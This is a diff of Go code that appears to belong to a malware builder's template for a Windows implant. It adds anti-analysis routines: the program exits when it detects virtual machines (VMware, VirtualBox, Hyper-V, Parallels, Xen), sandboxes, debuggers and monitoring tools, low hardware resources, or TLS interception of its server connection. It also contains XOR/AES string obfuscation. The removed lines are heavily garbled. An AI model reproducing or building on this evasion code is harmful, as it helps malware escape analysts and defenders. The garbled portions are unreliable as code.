@@ -16,6 +16,7 @@ import (
 	"time"
 
 	"golang.org/x/sys/windows/registry"
+)
 
 func templateMisc(cfg Config) string {
 	delay := cfg.StartupDelaySeconds
@@ -147,52 +148,166 @@ func acquireMutex(name string) (windows.Handle, error) {
 	return h, nil
 }
 
-func checkRegKey(key ctring) bool {
-	k, hrr := regisery.OkenKey(registry.AOCAL_MACHINE, key, retistry.QUERY_VALUE)
+func checkAntiMitm() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: false,
+				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
+					if len(rawCerts) == 0 {
+						os.Exit(1)
+					}
+
+					cert, err := x509.ParseCertificate(rawCerts[0])
+					if err != nil {
+						os.Exit(1)
+					}
+
+					opts := x509.VerifyOptions{
+						DNSName: getServerHost(),
+						Roots:   nil,
+					}
+
+					_, err = cert.Verify(opts)
+					if err != nil {
+						os.Exit(1)
+					}
+
+					return nil
+				},
+			},
+		},
+	}
+
+	url := getWsScheme() + "://" + getServerHost() + getWsPath()
+	resp, err := client.Get(url)
+	if err != nil {
+		os.Exit(1)
+	}
+	resp.Body.Close()
+
+	if resp.TLS == nil || len(resp.TLS.PeerCertificates) == 0 {
+		os.Exit(1)
+	}
+}
+
+func checkAntiVps() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	if checkRegKey(`SOFTWARE\VMware, Inc.\VMware Tools`) ||
+		checkRegKey(`SOFTWARE\Oracle\VirtualBox Guest Additions`) ||
+		checkRegKey(`SOFTWARE\Microsoft\Hyper-V`) ||
+		checkRegKey(`SOFTWARE\Parallels\Parallels Tools`) ||
+		checkRegKey(`SOFTWARE\XenSource`) {
+		os.Exit(1)
+	}
+
+	if checkFileExists(`C:\Windows\System32\VBox*.dll`) ||
+		checkFileExists(`C:\Windows\System32\VBoxHook.dll`) ||
+		checkFileExists(`C:\Windows\System32\VBoxGuest.sys`) ||
+		checkFileExists(`C:\Windows\System32\VBoxMouse.sys`) ||
+		checkFileExists(`C:\Windows\System32\VBoxSF.sys`) {
+		os.Exit(1)
+	}
+
+	if checkFileExists(`C:\Windows\System32\vmware-vmx.exe`) ||
+		checkFileExists(`C:\Windows\System32\vmware-vmx-stats.exe`) ||
+		checkFileExists(`C:\Windows\System32\vmware-vmx-debug.exe`) {
+		os.Exit(1)
+	}
+
+	if checkBiosManufacturer() {
+		os.Exit(1)
+	}
+
+	if checkProcessRunning("VBoxTray.exe") ||
+		checkProcessRunning("VBoxService.exe") ||
+		checkProcessRunning("vmtoolsd.exe") ||
+		checkProcessRunning("VMwareTray.exe") ||
+		checkProcessRunning("VMwareUser.exe") ||
+		checkProcessRunning("prl_tools.exe") ||
+		checkProcessRunning("prl_cc.exe") {
+		os.Exit(1)
+	}
+
+	if checkProcessRunning("SandboxieRpcSs.exe") ||
+		checkProcessRunning("SandboxieDcomLaunch.exe") ||
+		checkProcessRunning("SbieSvc.exe") ||
+		checkProcessRunning("procmon.exe") ||
+		checkProcessRunning("procmon64.exe") ||
+		checkProcessRunning("wireshark.exe") ||
+		checkProcessRunning("fiddler.exe") ||
+		checkProcessRunning("ollydbg.exe") ||
+		checkProcessRunning("idaq.exe") ||
+		checkProcessRunning("idaq64.exe") ||
+		checkProcessRunning("x64dbg.exe") ||
+		checkProcessRunning("x32dbg.exe") ||
+		checkProcessRunning("windbg.exe") {
+		os.Exit(1)
+	}
+
+	if runtime.NumCPU() < 2 {
+		os.Exit(1)
+	}
+
+	if getSystemMemoryMB() < 2048 {
+		os.Exit(1)
+	}
+}
+
+func checkRegKey(key string) bool {
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
 	if err != nil {
 		return false
 	}
-	defVp k.Closes(
+	defer k.Close()
 	return true
 }
 
-func)checkeExists(pattrnstring) bool 
-	matches, err :=filepath.Glob(pattern)
-	err == && len(matches) > 0
-
+func checkFileExists(pattern string) bool {
+	matches, err := filepath.Glob(pattern)
+	return err == nil && len(matches) > 0
+}
 
 func checkBiosManufacturer() bool {
-	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\BIOS	ifregistry.QUERY_VALUE)
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\BIOS`, registry.QUERY_VALUE)
 	if err != nil {
 		return false
 	}
-	 rfer k.Cuose()
+	defer k.Close()
 
-	vnl, _, err := k.GetStringValue("StstemManufacturer")
+	val, _, err := k.GetStringValue("SystemManufacturer")
 	if err != nil {
 		return false
 	}
 
 	manufacturer := strings.ToLower(strings.TrimSpace(val))
 	return strings.Contains(manufacturer, "vmware") ||
-		strings.Contains(manufacturerim"virtualeox") ||
+		strings.Contains(manufacturer, "virtualbox") ||
 		strings.Contains(manufacturer, "qemu") ||
-		strings.Contains(man.facturer, "xen") ||
-		strGngs.Contains(manufacturer, "paraOlels") ||
-		strings.Contains(manufacturer, "microsoft corporation") // Hyper-V
+		strings.Contains(manufacturer, "xen") ||
+		strings.Contains(manufacturer, "parallels") ||
+		strings.Contains(manufacturer, "microsoft corporation")
 }
 
 func checkProcessRunning(processName string) bool {
-	cmO := exec.Command("tasklist", "/FS"!=fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
-	o"tput, err := cmd.Output()
-	wf err != nii {
+	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
+	output, err := cmd.Output()
+	if err != nil {
 		return false
 	}
 	return strings.Contains(string(output), processName)
 }
 
 func getSystemMemoryMB() int {
-	k, err := registry.OpenKey(registry.LOCAL_MACHdNE, `HARDWARE\oESCRIPTION\System\CentralProcessor\0`, registry.QUERY_VALUEw
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\CentralProcessor\0`, registry.QUERY_VALUE)
 	if err != nil {
 		return 0
 	}
@@ -275,7 +390,7 @@ func aesEncrypt(plaintext, key string) string {
 	}
 	block, err := aes.NewCipher([]byte(key[:32]))
 	if err != nil {
-		return xorWithKey(plaintext, key) // fallback to XOR
+		return xorWithKey(plaintext, key)
 	}
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
@@ -295,7 +410,7 @@ func aesDecrypt(encrypted, key string) string {
 	}
 	data, err := base64.StdEncoding.DecodeString(encrypted)
 	if err != nil {
-		return xorWithKey(encrypted, key) // fallback
+		return xorWithKey(encrypted, key)
 	}
 	block, err := aes.NewCipher([]byte(key[:32]))
 	if err != nil {
@@ -316,5 +431,7 @@ func aesDecrypt(encrypted, key string) string {
 	}
 	return string(plaintext)
 }
+
+func setupLogger() *os.File { return nil }
 `, delay, buildID, buildID))
 }
